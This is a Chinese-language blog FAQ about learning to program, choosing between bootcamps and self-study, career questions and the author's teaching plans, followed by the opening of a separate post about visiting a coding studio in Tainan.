title="我確定要學程式了，我應該要去補習班還是自學？要去的話該如何挑選？"></a>我確定要學程式了，我應該要去補習班還是自學？要去的話該如何挑選？</h4><p>通常，是通常喔不是全部，會問這個問題的人比較適合去補習班。我碰過的很多沒補過習的人都不會問別人這個問題，因為他們自己就能夠想清楚，不用對外尋求解答。</p><p>其實這就像以前高中的時候你要不要考慮去補習班一樣，有可能同學去了所以你也去，有可能你想去那邊交朋友所以你去了，也有可能你是真的想去那邊學習。但無論如何，一定都會有個理由在那邊，才讓你決定去補習。</p><p>先來談談到底要去補習班還是自學就好，你是那種自制力很強的人嗎？可以自己排定計畫並且真的按部就班實行，一步步往自己的目標邁進？</p><p>如果是的話，那你幾乎不需要補習班了，除非你想加速學習，那補習班倒是有機會給你一些幫助（還是要慎選，因為有些補習班搞不好還會拖累你）。</p><p>之前在 ptt 時我有回過一篇類似的：<a href="https://www.ptt.cc/bbs/Soft_Job/M.1546655647.A.807.html">[心得] 從教學者的角度看無經驗轉職以及課程選擇</a>，裡面談到我自己覺得的補習班的價值在哪裡以及可以給到學生哪些幫助，因為裡面已經寫很多了我就不再寫一次了。</p><p>總結一下，如果你有自制力能夠自己主動學習，那補習班通常是不需要的，除非補習班提供的東西剛好是你所缺乏的；反之，補習班可能就是個適合你的地方，因為那邊有你需要的東西（動力管理、資源指引、問題問到飽等等）。</p><h3 id="學程式相關問題"><a href="#學程式相關問題" class="headerlink" title="學程式相關問題"></a>學程式相關問題</h3><h4 id="學程式應該要學些什麼？該培養哪些基礎？"><a href="#學程式應該要學些什麼？該培養哪些基礎？" class="headerlink" title="學程式應該要學些什麼？該培養哪些基礎？"></a>學程式應該要學些什麼？該培養哪些基礎？</h4><p>我都寫在這裡了：<a href="/2018/10/29/learn-coding-9c572c2fb2/">當我們在學程式時，要學的到底是什麼？</a></p><p>如果你還是對要學的東西有疑問，可以參考：<a href="http://huli.logdown.com/posts/703835">十年程式自學之路</a>、<a href="/2018/06/03/guide-for-getting-frontend-engineer-job-e73e04c2bec4/">教學實驗計畫</a>。</p><h4 id="非本科系與本科系的差別在哪裡？"><a href="#非本科系與本科系的差別在哪裡？" class="headerlink" title="非本科系與本科系的差別在哪裡？"></a>非本科系與本科系的差別在哪裡？</h4><p>其實平常大家慣用的「是不是本科系」的分法只是圖一種方便而已，因為非本科系的也可以去學本科系的那些科目，會這樣分是因為大家預設「非本科系」不會碰到那些資工系教的科目，所以更精確的說法其實是：「資工系在大學裡面學的到底是什麼？」</p><p>這個問題的答案，就是<strong>一般來說</strong>非本科系轉職跟本科系的差異。</p><p>答案包括但不限於：演算法與資料結構、作業系統、計算機概論、計算機組織與結構、組合語言、網路 TCP&#x2F;IP 等等，都是屬於比較「基礎」，或是說比較底層的知識，對於理解電腦的運作很有幫助。</p><p>非本科因為目標<strong>通常</strong>是轉職，所以<strong>通常</strong>都會學一些可以直接拿來用的技能而忽略上面講的那些比較底層的知識，導致有可能會了上層卻不懂下層在幹嘛，對整體比較沒有清楚的輪廓，發生問題時到一個程度就沒辦法再往下 debug。</p><p>或者說，我認為資工系的那些科目給了你理解原理的機會，讓你有「創造」出一個輪子的能力。如果缺乏那些技能，你很有可能就只能用別人做好的輪子而沒辦法創造。</p><p>舉例來說，今天大家都會用 MySQL，但如果公司覺得 MySQL 不太適合公司的業務，想要針對公司的架構自己寫一個新的資料庫系統，你做得到嗎？如果你沒修過資料庫系統的那些理論，如果你不懂檔案 IO 在做什麼，如果你不知道資料庫底層用的那些資料結構，你怎麼可能做得到？</p><p>這就是那些基礎理論派上用場的地方之一，必須很理解那些底層的知識才有可能重新造出輪子，而且是好用的輪子。但大家都需要自己做輪子嗎？當然不是，大多數的人其實用現成的工具就好了，因為現成的已經很好用了。</p><p>誰會需要自己做輪子？你看看那些開源出來的系統就知道了，Google、Facebook、Netflix、阿里巴巴、騰訊…，那些頂尖的網路公司流量超級大，就算是 1% 的優化也能夠起很大的作用，因為基數夠大，所以願意投入資源去做一些符合自己公司業務的系統，要找的人也會不太一樣。</p><p>但其他八九成的公司都是不需要這些的，他們可能只是小型的購物網站、接外包的公司、月 PV 沒破萬的討論區等等，這些公司只要用別人做好的工具就好，才符合效益嘛！</p><p>所以還是老話一句，寫程式只是手段，重點是你想達成什麼樣的目的。</p><h4 id="應該去學本科系的基礎還是新的工具？"><a href="#應該去學本科系的基礎還是新的工具？" class="headerlink" title="應該去學本科系的基礎還是新的工具？"></a>應該去學本科系的基礎還是新的工具？</h4><p>放 80% 的時間在基礎，20% 的時間拿去學新的工具與技術。基礎我指涉的範圍包括但不限於網路、瀏覽器運作原理、作業系統、資料結構與演算法等等，這些對長遠的發展來說比較有幫助。</p><p>不需要在學習新工具上面花太多的時間，很多工具的原理其實都十分類似，只有些許差異而已，只要能懂原理就能夠順利地學習。無論你學了多少工具，最後都會發現很多答案其實都藏在那些基礎裡面，終究要回去把那些基礎補齊。</p><p>基礎跟工具互不排斥，兩者是相輔相成的，你無法只學那些基礎而不會使用那些工具；你也沒辦法只會工具但沒有基礎。其實兩個一起學反而更好，你會更理解工具背後的基礎是什麼，更加理解為什麼工具會長這樣，也會知道為什麼我們需要學習基礎。</p><h4 id="如何培養演算法的基礎？"><a href="#如何培養演算法的基礎？" class="headerlink" title="如何培養演算法的基礎？"></a>如何培養演算法的基礎？</h4><p>在初學者的階段，別談那些大學課程的演算法（可以稱之為狹義的演算法，廣義的演算法可以看作是任何解決問題的方法），也別去寫什麼 leetcode，以你的程度寫了那些題目也是白寫。</p><p>先一步步把基礎打好並且熟悉程式解題的模式，知道什麼是輸入、什麼是輸出，知道如何符合題目的格式，知道題目跟你說的範圍是什麼意思，這些才是對初學者來說最重要的部分。</p><p><a href="https://www.lidemy.com/p/js101-javascript">我自己的課程</a>裡面就附了一大堆小題目，就算沒有買課程也能夠稍微猜到那些題目在做什麼，先把這些小題目搞定，我們再來談排序，再來談那些課本上會教的演算法與資料結構。</p><p>我在提供給學生的<a href="http://lidemy-oj.s3-website-ap-southeast-1.amazonaws.com/">簡易 Online Judge</a> 上放了許多 <a href="https://contest.cc.ntu.edu.tw/npsc2018/">NPSC</a> 的題目，我覺得這會是一個很好的開始，大家可以自己找一些題目來練習看看。重點是要先把自己的思考模式練的很「程式化」，看到題目之後就先拆解成一個個步驟，並且很明確知道每一個步驟要做什麼等等。</p><h3 id="職涯發展相關問題"><a href="#職涯發展相關問題" class="headerlink" title="職涯發展相關問題"></a>職涯發展相關問題</h3><h4 id="選工作的時候應該優先考量什麼因素？"><a href="#選工作的時候應該優先考量什麼因素？" class="headerlink" title="選工作的時候應該優先考量什麼因素？"></a>選工作的時候應該優先考量什麼因素？</h4><p>我自己會優先考量的是發展空間，在聽到工作內容時就差不多能知道在這間公司的發展性如何，我這邊指的發展性不是指說在公司內部是否能升官，而是指說個人能力的提升。</p><p>舉例來說，我現在這間公司找我的時候跟我說他們要把整個平台砍掉重練，所以我就知道如果進來的話，能夠跟著一個中型專案從無到有一路建立起來，我覺得這是很寶貴的經驗，所以對我來說會覺得很有發展空間。</p><p>這個邏輯可以套用到另一個問題：「什麼時候該離職？」，當你覺得發展空間有限，能學到的東西不多時就差不多可以離職了，到一個更有挑戰性的環境去。</p><p>除此之外，還有很多人會選團隊，覺得團隊對了整個就都對了，因為你有那個氛圍、有那個環境，就會是一個很適合發展的地方，大家互相砥礪一起進步。不過我從以前到現在都沒進過什麼大團隊，同事也都沒有真的到很厲害所以我還沒有機會體驗到就是了，或許等我進這種公司以後再來寫篇文章跟大家分享。</p><h4 id="怎樣才算是資深工程師？"><a href="#怎樣才算是資深工程師？" class="headerlink" title="怎樣才算是資深工程師？"></a>怎樣才算是資深工程師？</h4><p>關於這個問題我也想了好一陣子，在 2016 年底以及 2018 年底分別寫了下面這兩篇文章（請按照順序閱讀），看完以後你應該也會有些想法：<a href="https://github.com/aszx87410/blog/issues/14">一個資淺工程師年末的自我省視</a></p><p><a href="https://github.com/aszx87410/blog/issues/36">兩年過後，我能夠被稱為資深工程師了嗎</a></p><h3 id="出國工作相關問題"><a href="#出國工作相關問題" class="headerlink" title="出國工作相關問題"></a>出國工作相關問題</h3><h4 id="文憑對於國內外工程師求職或升遷有哪些影響呢？會有年齡歧視的問題嗎？"><a href="#文憑對於國內外工程師求職或升遷有哪些影響呢？會有年齡歧視的問題嗎？" class="headerlink" title="文憑對於國內外工程師求職或升遷有哪些影響呢？會有年齡歧視的問題嗎？"></a>文憑對於國內外工程師求職或升遷有哪些影響呢？會有年齡歧視的問題嗎？</h4><p>年齡歧視我不知道，或許有或許沒有，但國外的履歷一般來說都不會附上年齡，身旁也沒有相似的例子可以參考，所以無法回答。</p><p>我第一次在台灣求職時有些公司不知道是不在意還是忽略掉了，完全沒有問到跟我學歷相關的問題，但就算被問到了反正也就照實回答。工作兩三年之後跟我當初想像的一樣，也沒什麼人在看你的學歷了，工作經驗以及能力佔的比重高很多。何況以出國工作來說，誰會知道 NTU 是什麼學校？沒有被誤認為是南洋理工大學就不錯了。</p><p>有關於學歷，我工作到現在只認識到一個差異：工作簽證。有些國家的工作簽證是會看學歷的，如果沒有學歷的話就必須靠著其他專業能力的證明來補足，這方面沒學歷的人會比較辛苦一點，除了這個以外我都覺得沒什麼差別。</p><h4 id="去新加坡當工程師，英文要到哪個程度呢？"><a href="#去新加坡當工程師，英文要到哪個程度呢？" class="headerlink" title="去新加坡當工程師，英文要到哪個程度呢？"></a>去新加坡當工程師，英文要到哪個程度呢？</h4><p>可能比你想像中的門檻還要再低一點。日常溝通可以就沒問題了，不用聽得懂全部，我覺得會抓關鍵字外加能聽懂五六成就 ok 了，或是如果你還是不知道自己的能力夠不夠，給你一個最實際的方法：<strong>去投國外的公司面試看看，只要你面試能通過，英文能力一定沒有問題。</strong></p><p>關於我的英文程度以及我學習英文的歷程，請參考：<a href="/2018/06/12/english-174bd9b7c0ce/">我是如何緩慢提升英文能力的？</a></p><h4 id="新加坡的職場與台灣的職場差在哪裡？"><a href="#新加坡的職場與台灣的職場差在哪裡？" class="headerlink" title="新加坡的職場與台灣的職場差在哪裡？"></a>新加坡的職場與台灣的職場差在哪裡？</h4><p>插在土裡（沒有啦開玩笑的）。</p><p>與其討論兩個國家間的差異，不如討論公司之間的差異吧，每一間公司本來就不太一樣，台灣也有好公司，新加坡也有爛公司，這點無論是哪個國家都一樣。</p><p>我不喜歡談論這種比較，我覺得某部分只是不斷對刻板印象進行再製，何況我待在新加坡才兩年，也沒認識幾個新加坡人，怎麽會知道整個新加坡的狀況是怎樣？就算今天談論的是台灣好了，你問十個台灣人也有可能得到十個不同的答案，所以我通常不太會討論這種問題，除非我找到一個很值得去討論的切入點。</p><h3 id="產業相關問題"><a href="#產業相關問題" class="headerlink" title="產業相關問題"></a>產業相關問題</h3><h4 id="近年轉職前端工程師相當熱門，2019-轉職時機是否恰當？會不會開始趨近飽和？-我怎麼看這波熱潮的興衰"><a href="#近年轉職前端工程師相當熱門，2019-轉職時機是否恰當？會不會開始趨近飽和？-我怎麼看這波熱潮的興衰" class="headerlink" title="近年轉職前端工程師相當熱門，2019 轉職時機是否恰當？會不會開始趨近飽和？ 我怎麼看這波熱潮的興衰"></a>近年轉職前端工程師相當熱門，2019 轉職時機是否恰當？會不會開始趨近飽和？ 我怎麼看這波熱潮的興衰</h4><p>首先，我這個人不太看產業。意思是說你問我：「前端工程師之後會怎樣？這個產業會變得如何？」我會說我無法回答。</p><p>原因有兩個，第一個是要回答產業方面的問題你一定要有一定的經驗，還要能提出很好的理由。例如說你在這產業打滾很久、洞察出一些別人看不見的東西，或者是你有很好的理由去支持你的論述。但這些我都沒有，那我要怎麼回答你？</p><p>我當然可以說：「我覺得前端工程師會越來越熱門，工作機會越來越多」，但當你問我為什麼時，我只會回你：「沒有為什麼，我直覺這樣覺得而已」，這句話背後並沒有強力且客觀的理由去支持，純粹只有「我覺得」。但這就是一個很弱的宣稱，因為每個人都有自己的「我覺得」。</p><p>總之，我沒在看產業這一個部分，我也不打算對未來做任何的猜測。</p><p>有關這個問題，其實 Bernard 回的很不錯，我引<a href="https://tw.alphacamp.co/blog/2019-1-30-huli-bernard-engineer-career">他們文章</a>中的其中一段：</p><blockquote><p>最後，當被問到「工程師會否有飽和」時 Bernard 認為科技是未來產業的動能。所有產業對科技人才需求都會越來越大，人才之間的競爭，也不再受限於年齡、文化和地區。而作為軟體工程師的優勢，就是你可以<strong>不受地區與市場限制，全球都是你的機會</strong>。</p></blockquote><blockquote><p>「ALPHA Camp 在新加坡有一位來自尼泊爾的老師，16 歲自學程式，18 歲開始接美國企業的專案。今年 27 歲的他，已經成為接案公司的老闆，員工人數超過 30 人。他完全跳脫尼泊爾本土市場。軟體世界的好處是可以突破實體界線，然而現在競爭已經更加激烈。」<strong>所以要踏入軟體界的朋友，不要把眼光侷限在台灣。</strong></p></blockquote><blockquote><p>但 Bernard 也提醒當產業越熱門、學習資源越好取得，競爭門檻也越高。「懂基本的 HTML、CSS 不會讓你找到工作。<strong>你必須提高對自己的要求，也要拉高眼光和格局。」因為你的競爭對手，也會來自全世界。</strong>‍</p></blockquote><p>的確有越來越多人想轉職為前端工程師，而學習資源的確很好取得，競爭門檻也會越來越高，所以你必須一直精進自己一直往上爬，才能確保自己不會成為產業最底層的<a href="https://www.ptt.cc/bbs/Soft_Job/M.1548302683.A.D12.html">前端難民</a>。</p><p>所以，還在觀望的人依然可以懷抱著轉職夢去參加一些課程變成工程師，但你必須知道的是：「跟你一樣的人很多很多，所以競爭會很激烈」。想轉職本來就不是一件簡單的事情，而入門門檻低代表的就是大家都可以來分一杯羹，可取代性也會變高。或許現在供給多需求也多所以無所謂，但若是供給太多或是需求變少，就是要小心的時候了。</p><p>無論做什麼工作，都要持續提升自己。不提升也可以啦，但就是要做好會被輕鬆取代掉的心理準備。</p><h4 id="如何避免掉入補習班招生的花言巧語中？"><a href="#如何避免掉入補習班招生的花言巧語中？" class="headerlink" title="如何避免掉入補習班招生的花言巧語中？"></a>如何避免掉入補習班招生的花言巧語中？</h4><p>在<a href="/2019/01/21/mentor-program-2nd-review-e7c15f24dfb8/">《四個月過去了，來找我學程式的學生們怎麼樣了？》</a>裡面我有講到一些想法：</p><blockquote><p>關於學生的心得，我很討厭那種內容農場標題的心得文，而且有的不只標題是內容農場，內文也長得很內容農場，一直「這個」、「那個」到底是在公三小。我要的不是農場文，是你的心得；我要的也不是課程的業配文，而是誠實的心得。</p></blockquote><blockquote><p>我也不會說什麼你沒學程式就是魯蛇，來這邊轉職成工程師就可以變為人生勝利組。不是這樣的，寫程式沒有比較高尚，職業跟薪水不是讓你拿來做比較的，比起這些無謂的比較，找一份讓你能開心的工作比較實在。</p></blockquote><blockquote><p>如果你寫程式感到開心那當然很好，如果是為了錢想要轉職成工程師那也可以，因為錢可以讓你覺得開心。可是工程師這個職業跟其他職業都一樣，沒有高下之分，沒什麼好比的，人比人，氣死人；蛋糕比蛋糕，氣死蛋糕。想當工程師也很好，不想當工程師也很好。</p></blockquote><p>我從以前到現在一直是走一個誠實直白的路線，我在<a href="/2017/12/21/mentor-program-b5f96ae1eed1/">《從零到一：程式導師實驗計畫》</a>就有講過了：</p><blockquote><p>因為標題就開門見山說了這是一個實驗計畫，所以實驗目標到底會不會成功，我真的沒有百分之百的把握。</p></blockquote><blockquote><p>我是個誠實的人，我只敢保證我真的確定能做的事，所以為了不讓你吃虧，我提供了自認為還不錯的條件（30 天內全額退費、比外界低廉的學費、沒就業就退費）來彌補。</p></blockquote><blockquote><p>對你來說，報名這個計畫有三種可能：</p></blockquote><blockquote><p>老師很爛教得很差 -&gt; 開課 30 天內退費 -&gt; 損失時間但沒損失錢</p></blockquote><blockquote><p>老師教得不錯 -&gt; 可是結業後找不到工作 -&gt; 損失時間但沒損失錢</p></blockquote><blockquote><p>老師教得很棒 -&gt; 找到工作 -&gt; 用一個月的薪水換到一份新工作</p></blockquote><blockquote><p>另外，我不會強調每一個人都一定要當軟體工程師，或者是什麼寫程式是之後的未來趨勢。我又不是未來人，我怎麼知道未來趨勢是什麼。而且每個人都有自己的興趣，如果你寫一寫發現自己真的不適合，我也不會強迫你。</p></blockquote><p>直白從好的角度來看就是誠實，從另一個角度看也可以說我不會包裝。因為我本來就不是以商業為目的，賺多少錢我不太在意，所以也不需要靠著包裝吸引別人。</p><p>回到原本的問題，如何避免掉入花言巧語之中？有提到<strong>夢想、魯蛇、賺大錢、保證、未來趨勢</strong>這些字眼的都可以額外再留意一下。與其看這些包裝過後的東西，不然直接把課程的課綱拿給認識的工程師朋友看，畢竟實力才是決勝的關鍵。</p><h4 id="程式補習班跟線上課程越開越多、學費也越來越貴，是不是當補習班-線上課程的業者比起從事程式設計更好賺？可以賺到成就感跟一堆學生的崇拜？"><a href="#程式補習班跟線上課程越開越多、學費也越來越貴，是不是當補習班-線上課程的業者比起從事程式設計更好賺？可以賺到成就感跟一堆學生的崇拜？" class="headerlink" title="程式補習班跟線上課程越開越多、學費也越來越貴，是不是當補習班&#x2F;線上課程的業者比起從事程式設計更好賺？可以賺到成就感跟一堆學生的崇拜？"></a>程式補習班跟線上課程越開越多、學費也越來越貴，<strong>是不是當補習班&#x2F;線上課程的業者比起從事程式設計更好賺？</strong>可以賺到成就感跟一堆學生的崇拜？</h4><p>在《<a href="/2018/07/12/mentor-program-s2-f876c4e13d3b/">程式導師實驗計畫第二期報名簡章</a>》裡面我有提到關於騙錢以及學費這件事我的看法：</p><blockquote><p>對我來說，我對學費的看法很簡單，這就是個買賣，是個契約關係，只要它是公平的沒有隱滿任何資訊，然後雙方又都可以接受這個價錢，那就沒有任何問題。</p></blockquote><blockquote><p>舉例來說，如果你今天去吃墾丁滷味然後招牌上沒寫價錢，你問老闆他只說：「就跟一般的價錢差不多啦」，而你吃完之後發現一盤豆干要五百塊（假設平均價格只要五十），那你可以說這間店坑錢，因為資訊不對稱，老闆刻意隱滿了價格資訊誤導你。</p></blockquote><blockquote><p>但若是今天這間滷味店價目表就已經寫給你看了，上面就寫說：「一盤豆干五百塊，不保證很好吃」，然後你接受了這個價錢也點了，最後發現豆干普普通通，你可以說：「這豆干不值得這個價錢」，但你不能說老闆騙錢，因為是你自己要點的，而老闆也沒說這豆干很好吃，而且你點餐的時候就已經知道是五百塊了，老闆何來的「騙」？。</p></blockquote><blockquote><p>再把這個例子往下推，假設今天滷味店價目表寫了一盤豆干五百塊並且提供試吃，而你試吃之後決定買了，一旦你決定買了，之後就沒有任何的問題，因為第一你已經知道價格，第二你已經試吃過了，老闆已經把所有的資訊都揭露給你，而你也同意了五百塊這個價格，那就是你情我願，沒有任何問題。</p></blockquote><blockquote><p>其實這就像是簽合約一樣，所有條款詳細都列在上面了，如果你是在神智清楚的情況下自願簽了這份沒有違反任何善良風俗的合約，就代表你自己同意了，之後就要自己承擔責任。</p></blockquote><blockquote><p>我想做到的就是最後一個例子，所以我一開始就說明了我收費的標準是：「你有找到工作」才收費，否則不收任何學費（3000 塊保證金如果你有跟完課程是拿得回來的，等於沒有付任何錢）。我把收費標準清楚的公開了，也讓你有試上課程的機會。你一旦報名了，就代表你同意這個收費規則。如果你跟完課程還找不到工作，我一毛都不會拿；但如果你順利找到了，該拿的我也不會少拿。</p></blockquote><p>就像 Bernard 所說的，教學可以很好賺，也可以很難賺，端看你要選擇怎樣的路。有些人出來開一次課程之後就收手了，也有像他們一樣持續經營幾年還在做教育的。</p><p>我也同意近幾年來程式相關課程一個一個開，至於學費有越來越高嗎？我覺得還好，你會看到學費較高的通常課程內容也比較多。</p><p>講個小故事，很多人看路上一大堆手搖飲料店覺得開這個好賺，但實際踏入之後才會發現水有多深，不像自己想像中這麼簡單，進來的很多，倒掉的其實也不少。如果你是三四年前就開始經營程式教學，或許那時候好賺，因為競爭少，學生的選擇也比較少。</p><p>可是現在大家都跳進來做了，沒有一定的品質你是沒辦法出線的，就跟 YouTuber 一樣。很多人看這個產業現在這麼熱門，頂級 YouTuber 們的生活令人羨慕於是大家紛紛投入。可是這就像是個金字塔，你剛進去的時候就在金字塔的底層，是人最多的一層，你必須要有能力爬到頂層去才能開始賺錢。</p><p>我的偶像 <a href="https://medium.com/%E8%80%81%E9%97%86%E4%BE%86%E9%BB%9E%E5%AF%87%E6%B1%80%E5%90%A7/%E9%87%80%E9%80%A0%E4%B8%80%E9%96%80%E7%B5%90%E5%90%88%E7%B6%B2%E9%A0%81-%E8%A8%AD%E8%A8%88-%E6%95%B8%E5%AD%B8%E8%88%87%E7%89%B9%E6%95%88%E7%9A%84%E7%B7%9A%E4%B8%8A%E7%A8%8B%E5%BC%8F%E8%AA%B2%E7%A8%8B-cef5d998c707?source=user_profile---------2------------------">Hahow 一哥吳哲宇</a>在 Hahow 上的課程就賣得很好，你自己隨便算一下就知道大概賣了多少錢，可是為什麼能賣那麼多？因為課程品質真的很好，內容也很豐富，他也花了一大堆時間在這個上面才能產出這種結果。</p><p>程式線上課程沒有好賺到隨便一個香蕉芭樂出來開課都能夠賣翻天，市面上看到課程賣得好的幾乎都累積了一定的聲量也有一定的品質。市場機制會慢慢平衡，品質差的課程會被淘汰，好的會出線。</p><p>至於成就感跟學生崇拜這個也問得滿奇怪的，不太知道該怎麼答。但以我來說的話成就感來自於學生的成功而不是開課這件事情本身，學生沒有成長的話，就算我課程賣一百萬也沒什麼用。至於崇拜的話，實力差的人就算開了課也不會令人崇拜；實力強的人不開課也能受人景仰。</p><h3 id="教學相關問題"><a href="#教學相關問題" class="headerlink" title="教學相關問題"></a>教學相關問題</h3><h4 id="為什麼我要做教學？"><a href="#為什麼我要做教學？" class="headerlink" title="為什麼我要做教學？"></a>為什麼我要做教學？</h4><p>我做教學最主要的目的不是為了幫你實現你的夢想，不是為了賺你錢，也幾乎不管你到底為什麼想當工程師，也不管這個產業之後會如何，我覺得那些不關我的事。</p><p>我想做的只是自我實現，想證明我很能教，證明我的教學比任何人都厲害。如同<a href="/2019/01/21/mentor-program-2nd-review-e7c15f24dfb8/">我之前寫過的</a>：</p><blockquote><p>結果對我來說其實沒那麼重要，重要的是中間學習到的過程，重要的是結束以後要如何把課程改得更好。我對教學這件事情是有信仰的，而有無信仰的差別就在於你是否會為了結果而改變。</p></blockquote><blockquote><p>「我可以幫助幾乎任何想要轉職工程師的人變成工程師，因為我很會教」，現在事實證明我目前無法達成這件事，但我會認為是「我可以做得更好」而不是「我做不到」，這就是為什麼我說這是信仰，或你要說我自我感覺良好也行。</p></blockquote><blockquote><p>我還是認為我的課綱跟教法相較於其他人有獨特的優勢，但以結果來說目前還無法把這個優勢突顯出來，所以我只能不斷改進以此證明我是對的。但有時候我也會想説這個好像也沒那麼重要，我證明這個要幹嘛？但想了想，我應該只是想證明給自己看，證明我是做得到的。</p></blockquote><p>雖然我也不知道這麼中二的目標是怎麼來的，但總之就是這樣了，這才是我教學最根本的目的，也是持續推動我的動力。</p><p>第一階段我想做到的是只要你願意付出時間，我就一定能教會你。例如說你真的能夠每週四十小時持續六個月，我就保證你一定能學成功，這是我想達到的目標。如果你學不成功，我不會說是你沒天份，我會說是我可以教得更好。</p><p>第二階段我想更進一步，就算你有時候偷懶不願意付出時間，我也能利用一些<strong>方法</strong>來促使你付出時間，意思就是我可以幫助你提升你的動力，讓你願意繼續學程式。這方面可以參考我之前寫過的<a href="/2018/09/26/procrastination-ba12754ada49/">《致跟我一樣的拖延症患者：動力是需要刻意創造的》</a>。</p><p>只是有很多人不會這樣想，他們會認為拿出決心跟毅力是你自己的事，跟教學者一點關係都沒有，這都是你自己的責任。這些想法都很合理，但我認為我可以努力到能夠改變一個人，讓他變成可以拿出決心跟毅力的人。聽起來或許很天真也很難，而且我也還沒找到方法來做這件事，但我相信我可以，我就是相信。</p><h4 id="之後對於教學的後續規劃為何？"><a href="#之後對於教學的後續規劃為何？" class="headerlink" title="之後對於教學的後續規劃為何？"></a>之後對於教學的後續規劃為何？</h4><p>第二期教學的部分結束了，整個計畫要到 3&#x2F;14 才會正式落幕。其中也有些同學問我第三期到底會不會開，而我都回他們說我真的不確定。</p><p>跟大家講一下現在的狀況好了，我今年五月會開始放長假，一直到今年底以前都不打算工作也不打算找工作，想要全心全意來去旅遊度假一下。所以儘管有第三期，形式也會變得不太一樣，像是每週固定直播的部分一定得取消，只能改為全部看第一期跟第二期的影片（但幸好有前兩期的累積，影片數量還滿多的）</p><p>再來改作業也會有點麻煩，變得我必須帶筆電出門，但我原本就有在考慮這件事，所以也不是不可能。總之對於教學的品質上一定會有所犧牲，所以真的要開第三期的話我要再想清楚新的課綱長什麼樣子以及教學的形式會是如何。</p><p>所以到底會不會有第三期呢？</p><p>我不確定，現在真的還不確定。依照慣例，如果真的對第三期很有興趣的話，歡迎填寫表單，真的有第三期的話你會收到信件通知：<a href="https://goo.gl/forms/NmoLBMoQpXBTvIam1">https://goo.gl/forms/NmoLBMoQpXBTvIam1</a></p><p>除了程式導師實驗計劃以外，我最近也一直在想我手邊的資源要怎麼最有效的利用。舉例來說，為了這個計畫我錄了一些教學影片，其實可以當作單堂的線上課程來賣。</p><p>或是計畫本身的直播存檔也可以當作課程賣，但這樣勢必就會面臨一個問題：「程式導師實驗計畫跟一般線上課程的差別在哪？」，這些都是我還要再花時間去想的問題。</p><p>如果有人有什麼好的建議也歡迎留言或是私訊跟我說，我會很感謝你的。</p><h3 id="總結"><a href="#總結" class="headerlink" title="總結"></a>總結</h3><p>希望這篇能回答到大多數的問題，以後我就不用一直重複回答了。如果你還有其他問題想問的，可以直接在底下留言，如果我覺得 ok 的話就會在文中把你的問題以及我的回答補上。如果我覺得問題太 specific，不是常見的問題的話，我一樣會直接回答，只是不會放到文章裡面。</p><p>其實寫這篇除了回答問題以外，也能夠順便把自己對這些問題的看法整理一下，順便檢視自己有沒有自相矛盾的地方。寫的時候有發覺幾點可以再往下延伸或是說得更清楚的地方，不過我自己也還需要一點時間再想想該怎麼説，畢竟有些議題就是三言兩語很難講清楚，需要更大的篇幅還有更多的時間。</p><p>除此之外，最近在想一些關於我的課程的很「根基」的問題，例如說我到底想要服務誰？我想以怎樣的方式上課？我想培養出怎樣的工程師？課程的收費方式到底應該如何？沒意外的話之後會寫一篇來講這些事情，內容大概會是一個跟自己對話的過程。</p><p>總之就是這樣啦，這篇文章發佈於大年初二，順便祝大家新年快樂！</p>]]></content>
      
      
      <categories>
          
          <category> 學習 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 學習 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>好想工作室朝聖之旅：相信分享與交流可以讓世界更美好</title>
      <link href="/2019/01/28/goodideas-studio-98dbafb99abf/"/>
      <url>/2019/01/28/goodideas-studio-98dbafb99abf/</url>
      
        <content type="html"><![CDATA[<p><img src="/img/goodideas-studio-98dbafb99abf/1__DiH9rH6CJiEk0Wa7s__6gFw.jpeg"></p><p>不像那些需要點閱率來養活自己的媒體，我在下標題時優先考慮的是自己對這標題的喜愛程度以及創意，原本想下個「好想工作室，是好想一起工作」之類的，後來想了想發現把我自己在 Profile 頁面的一段話拿來放上去也挺搭的，於是就這樣了。</p><p><a href="https://www.facebook.com/GoodideasStudio/">好想工作室</a>是個我一直很想去的地方，一年半前因緣際會認識那邊的老大 Howard 以後就想找個機會去參觀，畢竟聽了這麼多還不如自己走一遭，感受也會更真實一些。</p><p>剛好這次回台灣有些空檔，就敲定了時間去那邊參觀，運氣很好地選到了禮拜四，剛好是他們每週「想知道嗎」的分享會時間。接下來以我最喜愛的流水帳方式記錄一下我去參觀的整個過程。</p><p>如果你不知道什麼是好想工作室也沒關係，接下來我也會介紹一下。</p><p>好想工作室位在台南文化產業創意園區裡面，離台南車站滿近的，步行十分鐘以內即可到達，先來講一下我去以前對好想工作室的理解。</p><p>根據我的理解，我不知道那邊怎麼賺錢，我也不知道那邊的營運模式是怎樣，我只知道他們提供了免費的程式培訓，而且模式很不一樣。不像傳統的培訓班或是補習班提供的是師資跟教材，那邊提供的是環境跟同儕，在那邊不會有人每天出題目給你，你想學什麼都自己想自己來，有 mentor 可以跟你討論或是給你一個大方向，但不會手把手教你，學習的部分完全靠你自己。</p><p>簡單來說就是你人過去那邊，然後說我想學前端，前端的 mentor 就給你一些大方向，例如說：「那你先做個 todo list 好了」，HTML 怎麼寫、CSS 怎麼寫、JS 怎麼寫就是你自己要去研究的東西，但如果碰到任何問題都可以問旁邊的同學或是 mentor。</p><p>就像我上面所說的，它提供的是環境。請大家記住環境這個詞，因為這是這篇文章的文眼，哪天你看到這篇文章被放到國文考卷上並且要你賞析的時候，答案選「環境」就對了。</p><p>想更理解內部的人的說法的話，可參考：<a href="https://blog.devdon.com/?p=4283">好想工作室 - 讓自己選擇想做的事</a></p><p>我以前在<a href="/2018/06/26/mentor-program-review-a9c6668dfb/">教學心得</a>裡面也有提過好想工作室的教學模式：</p><blockquote><p>舉<a href="https://blog.devdon.com/?p=4283">好想工作室</a>作為例子，他們選擇了什麼都不教。你有問題你可以問，然後那邊的人會給你一堆任務要你去做，但不會直接教你也不會上課。他們藉由這樣子的方式來培養自學能力，一旦結業了，就能確保你一定擁有自學能力  — — 因為你就是這樣走過來的。</p></blockquote><p>而這種模式的 trade-off 就是時間，拿長一點的時間來換自學能力。以我自己的課程來說我就選擇犧牲一點自學能力來把時間弄得更短。這兩者沒有優劣，只有選擇。</p><p>以上差不多就是我去以前對好想工作室的理解。</p><p>總之呢，一到好想工作室以後發現分享會的時間差不多到了，台前的人已經在準備，Howard 邊帶著我介紹工作室環境邊介紹幾個今天也有來的朋友們，像是介紹區塊鏈的 <a 